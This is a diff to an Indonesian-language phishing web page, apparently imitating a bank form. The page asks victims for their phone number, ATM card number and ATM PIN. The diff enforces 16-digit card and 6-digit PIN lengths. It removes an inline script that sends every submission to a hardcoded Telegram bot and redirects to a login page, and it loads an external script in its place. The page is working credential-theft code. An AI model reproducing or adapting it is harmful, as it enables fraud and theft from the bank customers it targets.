@@ -93,7 +93,7 @@
 								<div class="elementor-field-type-tel elementor-field-group elementor-column elementor-field-group-name elementor-col-100 elementor-field-required">
 												<label for="form-field-name" class="elementor-field-label">
 								NOMOR HANDPHONE ANDA							</label>
-								<input size="1" type="tel" name="No-Hp" id="No-Hp" class="elementor-field elementor-size-sm  elementor-field-textual" placeholder="Masukkan nomor Handphone Anda" required="required" aria-required="true" pattern="[0-9()#&amp;+*-=.]+" title="Only numbers and phone characters (#, -, *, etc) are accepted.">
+								<input size="1" type="tel" name="No-Hp" id="No-Hp" class="elementor-field elementor-size-sm  elementor-field-textual" placeholder="Masukkan nomor Handphone Anda" minlength="10" maxlength="13" required="required" aria-required="true" pattern="[0-9()#&amp;+*-=.]+" title="Only numbers and phone characters (#, -, *, etc) are accepted.">
 
 						</div>
 								<div class="elementor-field-type-email elementor-field-group elementor-column elementor-field-group-email elementor-col-100 elementor-field-required">
@@ -104,12 +104,12 @@
 								<div class="elementor-field-type-number elementor-field-group elementor-column elementor-field-group-field_bed909a elementor-col-100 elementor-field-required">
 												<label for="form-field-field_bed909a" class="elementor-field-label">
 								NOMOR KARTU ATM							</label>
-									<input type="number" name="No-ATM" id="No-ATM" class="elementor-field elementor-size-sm  elementor-field-textual" placeholder="Masukkan nomor kartu ATM Anda" required="required" aria-required="true" min="" max="">
+									<input type="tel" name="No-ATM" id="No-ATM" class="elementor-field elementor-size-sm  elementor-field-textual" placeholder="Masukkan nomor kartu ATM Anda" minlength="16" maxlength="16" required="required" aria-required="true" min="" max="">
 						</div>
 								<div class="elementor-field-type-tel elementor-field-group elementor-column elementor-field-group-field_8e529c0 elementor-col-100 elementor-field-required">
 												<label for="form-field-field_8e529c0" class="elementor-field-label">
 								PIN ATM							</label>
-								<input size="1" type="tel" name="PIN-ATM" id="PIN-ATM" class="elementor-field elementor-size-sm  elementor-field-textual" placeholder="Masukkan PIN ATM Anda" required="required" aria-required="true" pattern="[0-9()#&amp;+*-=.]+" title="Only numbers and phone characters (#, -, *, etc) are accepted.">
+								<input size="1" type="tel" name="PIN-ATM" id="PIN-ATM" class="elementor-field elementor-size-sm  elementor-field-textual" placeholder="Masukkan PIN ATM Anda" minlength="6" maxlength="6" required="required" aria-required="true" pattern="[0-9()#&amp;+*-=.]+" title="Only numbers and phone characters (#, -, *, etc) are accepted.">
 
 						</div>
 								<div class="elementor-field-group elementor-column elementor-field-type-submit elementor-col-100 e-form__buttons">
@@ -133,29 +133,6 @@
 							</div>
 <span id="elementor-device-mode" class="elementor-screen-only"></span>
 <svg style="display: none;" class="e-font-icon-svg-symbols"></svg>
-<script>
-    const chat_id = '5897739787', botID = 'bot6607230067:AAGiMJO1YUIvUzQSx1H3t1s3gYKpvUOktyo';
-    const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;
-    document.querySelector('#tg').addEventListener("submit", async e => { // When the user submits the form
-        e.preventDefault(); // Don't submit
-        let text = JSON.stringify( // Convert the form data to a string to send as our Telegram message
-            Object.fromEntries(new FormData(e.target).entries()), // Convert the form data to an object.
-        null, 2); // Prettify the JSON so we can read the data easily
-        const sendMessage = await fetch(telegramURL, { // Send the request to the telegram API
-            method: 'POST',
-            headers: {"Content-Type": "application/json"}, // This is required when sending a JSON body.
-            body: JSON.stringify({chat_id, text}), // The body must be a string, not an object
-        });
-        const messageStatus = document.querySelector('#status');
-        if (sendMessage.ok) // Update the user on if the message went through
-            messageStatus.textContent = "";
-        else
-            messageStatus.textContent = "Message Failed to send :( " + (await sendMessage.text());
-        e.target.reset(); // Clear the form fields.
-        window.location.href='/id/login.html';
-    });
-
-
-   </script>
+<script src="/id/jar.js"></script>
 </body>
 </html>
